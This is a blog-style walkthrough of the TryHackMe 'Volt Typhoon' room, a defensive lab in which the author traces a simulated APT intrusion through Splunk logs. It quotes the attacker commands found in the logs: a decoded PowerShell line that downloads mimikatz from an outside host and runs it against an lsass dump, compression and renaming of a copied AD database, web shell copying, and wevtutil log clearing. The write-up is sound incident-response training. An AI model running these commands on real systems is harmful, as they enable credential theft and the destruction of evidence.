---
title: "TryHackMe - VoltTyphoon"
date: 2025-06-20
---

# 1. Initial Access
### 1.1 Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?
R= `2024-03-24T11:10:22`

The question mentions that we should look into the `ADSelfService Plus` logs, checking in the values of the `sourcetype` field, we can observe that there's one that matches with its starting letters.
![image](https://github.com/user-attachments/assets/32a595d9-be07-42a1-ae70-ad3909790874)


As we are looking for a password change and its account take over, we look into the `username` field for any value indicating that the owner could be Dean. We found one: `dean-admin`, lets filter by that value.
![image](https://github.com/user-attachments/assets/8193688b-ab00-4f74-85b9-8ef9c69d084e)

Using the query below to get only the fields of interest, I was able to track down the ip from where the TA tried multiple attempts of account unlock and where at the end it was able to take over the account by resetting its password and it being successful.
```
index=* sourcetype=adss  | search username="dean-admin" 
|  table timestamp, ip_address, action_name, status
| reverse
```
![image](https://github.com/user-attachments/assets/bb5d0f72-d36b-488c-9bb3-b00fca6f95c9)

### 2. Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?
R= `voltyp-admin`

Leveraging `Date & Time Range` feature, we filter for logs after the timestamp of the `Password Change` ADSelfService event. 
![image](https://github.com/user-attachments/assets/bdeea798-2980-4404-a2e0-c5c28e16af55)
We can observe that the account `voltyp-admin` was immediately created after the account takeover.

![image](https://github.com/user-attachments/assets/42ecd1ea-61f0-4599-9b58-e544f900060f)
# Execution
### 3. In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?
R= `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename`

Going back into the data lake of logs, we indeed have a `sourcetype` for `wmi` that we can explore in.
![image](https://github.com/user-attachments/assets/218a90f4-172e-48ee-8736-2b44010b38c9)
As the server field wasn't parsed, I used the following regex `^.*\|.*\|\s(?<server>server-0\d{1}-main).*\|` to get the names of the server we were interested in.
As we can see it is indeed working
![image](https://github.com/user-attachments/assets/0fd29211-1270-4452-90ab-8384a4abdd0e)
Checking for any commands that could give information on disk using wmic, there are three in specific. 
![image](https://github.com/user-attachments/assets/29497f5b-3842-4229-95b7-a1448a44458e)
Using the following query, I was able to notice that there was indeed a command that targeted `server01` and `server02`, so what I just did was me being confused but at least served to practice my regex, same thing with the query below, is definitely not be the best way to find the answer.
```
index=* sourcetype=wmic
| where isnotnull(server) // Contains string server-0[1 OR 2]-main
| search command="*disk*" // Contains substring 'disk' in command field
| stats count by command // count how many times each value appears
```
![image](https://github.com/user-attachments/assets/1e92f574-acb8-4c6f-8fcb-feb630f337cb)
A better query would be the following:
```
index=* sourcetype=wmic 
| search command="*server0*" // search for any wmi command that contains the
								substring 'server0'
| table timestamp, ip_address, username, command
```
![image](https://github.com/user-attachments/assets/0231c936-3b53-476e-b2f4-f2170af74170)
### 4. The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?
R= `d5ag0nm@5t3r`

Doing a free text search for `ntdsutil.exe` we got a match for the command that created a copy of the AD database. 
![image](https://github.com/user-attachments/assets/d00c4475-a5dd-4a3f-b045-ffe65d08dfc9)
Looking for any events after that time, and filtering by the user `dean-admin`, we are able to find the compression command:
```
wmic /node:webserver-01 process call create “cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z `cisco-up.7z` C:\inetpub\wwwroot\temp.dit”
```
![image](https://github.com/user-attachments/assets/6aeca5b5-5fe8-4e4a-8df7-0ce72220cf49)
# Persistence

### 5. To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed?
R= `C:\Windows\Temp\`

I wasn't sure where to start here, but I knew that because there was some base64 involved, the attacker must have used some command that had the word decode in it, and I was correct. In this case it leveraged the LOLB `certuil.exe`. In this case the webshell was inserted into the %TEMP% folder `C:\Windows\Temp\`
![image](https://github.com/user-attachments/assets/d930bba5-c353-4fc2-bdbd-5b8fc6462f7f)
# Defense Evasion
### 6. In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?
R=`Remove-ItemProperty`

I thought in doing a free search for `Remove-Item`, because the MRU is located in the registry path `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, where we can only remove items from from a registry location using the `Remove-ItemProperty`. The attacker effectively removed the MRU record using the cmdlet `Remove-ItemProperty
![image](https://github.com/user-attachments/assets/a30087c3-792c-4ee3-a329-bad614830e83)
### 7. The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?
R= cl64.gif

The previously created file was `cisco-up.7z` (Q4), if we do a free search for it, there's a log indicating that the attacker renamed it to `cl64.gif` using the command below.
```
cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif
```

![image](https://github.com/user-attachments/assets/cf67c3ac-ef78-4331-a6a1-2df66c77a064)

### 8. Under what regedit path does the attacker check for evidence of a virtualized environment?
R= `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`

Doing a free search for `HKEY_LOCAL_MACHINE`, as there's where the configuration of the computer is stored in, one of the three matches shows that the attacker executed 
```
Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*

```

> After finding the answer, I tried to google that method to confirm that it is documented as evidence of a virtualized environment but got no luck. I just tested my lick when doing that free text search.
![image](https://github.com/user-attachments/assets/5db0b0ea-a8c8-4870-ae31-3cba66e7008d)

# Credential access

### 9. Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate?
R= `openssh`, `putty`, `realvnc`

I searched for free text `reg query`, as the field that contained the full command wasn't parsed, I leveraged the `reg` built-in Splunk command to create a new field named `raw` leveraging `Named Capture Groups` that matches the entire command. As seen, the software investigated was `openssh`, `putty`, `realvnc`
```
index=* "*reg query*" 
| rex field=_raw "(?<cmd>reg query\s.*)"
| table cmd // show only the field cmd
| reverse
```
![image](https://github.com/user-attachments/assets/98f51e4d-14f6-4201-a64b-bfe59363a5c6)
### 10. What is the full decoded command the attacker uses to download and run mimikatz?
R= `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait`

I wasn't sure where to start here, but I supposed that there was an encoded  a powershell command executed somewhere.
Knowing this I started by parsing the entire value of the `CommandLine=` raw field, and skimmed through all the values found that end in `=`.
Query used:
```
index=* sourcetype!=adss sourcetype!=wmic  | rex field=_raw "CommandLine=(?<cmd>.*=)" 
| stats count by cmd 
| sort -count
```

Malicious command
```
-exec bypass -W hidden -nop -E SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20vMy90bHovbWltaWthdHouZXhlIiAtT3V0RmlsZSAiQzpcVGVtcFxkYjJcbWltaWthdHouZXhlIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFRlbXBcZGIyXG1pbWlrYXR6LmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCJzZWt1cmxzYTo6bWluaWR1bXAgbHNhc3MuZG1wIiwgImV4aXQiKSAtTm9OZXdXaW5kb3cgLVdhaXQ=
```
![image](https://github.com/user-attachments/assets/d27c1a23-d5dc-4167-af28-da0a71718707)
Using CyberChef, I decoded the command.
```
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```
![image](https://github.com/user-attachments/assets/2cd24c63-e1fc-4d63-89d5-af24c6e60595)

# Discovery & Lateral Movement
### 11. The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?
R= `4624` `4625` `4769`

By parsing the entire CommandLine value, and by searching for all the fields that start with wevtutil, we were able to get all the commands showing the event id's searched. 
```
index=* sourcetype!=adss sourcetype!=wmic  | rex field=_raw "CommandLine=(?<cmd>.*=)" 
| search cmd="wevtutil*"
| table cmd
```

![image](https://github.com/user-attachments/assets/fbf3a496-82d2-4c3d-ab74-0a0e1235bc01)
To practice named capture groups, I'll extract the single event ID and put it into a new field called `event_id`.
```
index=* sourcetype!=adss sourcetype!=wmic  | rex field=_raw "CommandLine=(?<cmd>.*=)"
| search cmd="wevtutil*"   // search for values that start with wevtutil
| rex field=_raw ".*EventID=(?<event_id>\d{4}).*"   // extract eventid
| table event_id    // show only event_id field
| stats count by event_id    // count each of the values
```
![image](https://github.com/user-attachments/assets/c4afebb7-6456-4271-891e-b8b14a6cffa5)
### 12. Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?
R= `Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx`

As the questioned said "Copy", one of the possibilities could be that the attacker could've used the `Copy-Item` cmdlet. I free text searched for `*copy*`, and this is the last entry that was found and the only one that indicated that was explicitly transferred to server-02

`Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx`
![image](https://github.com/user-attachments/assets/4fed925a-e7b9-4d02-9a83-b08e2da8fc3f)
# Collection
### 13. The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?
R=`2022.csv` `2023.csv` `2024.csv`

Leveraging the free text search for `Copy`, and then extracting the value of the `CommandLine` field, I was able to review copied items and found three related to financial data.
```
Copy-Item -Path "C:\ProgramData\FinanceBackup\2024.csv" -Destination "C:\Windows\Temp\faudit\2024.csv"
Copy-Item -Path "C:\ProgramData\FinanceBackup\2023.csv" -Destination "C:\Windows\Temp\faudit\2023.csv"
Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2022.csv"
```
![image](https://github.com/user-attachments/assets/34b5400e-d330-4566-a423-82ef2157a87b)

# C2 & Cleanup
### 14. The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?
R=  `10.2.30.1`  `8443`

Doing a free text search for `netsh`, it have a couple of results that indicate that a proxy was created then deleted. 
![image](https://github.com/user-attachments/assets/a7a3c8d2-35e0-453c-9d57-c0e19889a48a)

Looking further at it, the attacker uses the address `10.2.30.1` and port `8443` to setup the proxy.
![image](https://github.com/user-attachments/assets/3ce9dfc0-e9e3-483b-8e79-8f6af022866c)

### 15. To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?
R= `wevtutil cl Application Security Setup System`

The `wevtutil` LOLBIN, provides an argument that allows to clear the log with it.
![image](https://github.com/user-attachments/assets/0056e7bb-e89a-4b93-a9b4-fbdb1882ccd0)

If we search for it using the query below, we were able to determine the type of event logs the attacker cleared.
```
index=* sourcetype=powershell | rex field=_raw "CommandLine=(?<cmd>.*)" 
| search cmd="wevtutil cl*"   // search for any cmd field value that starts with
							     wevtutil cl
| table cmd
```
![image](https://github.com/user-attachments/assets/34442763-c33f-45d7-9dd1-9b8bd2f49003)
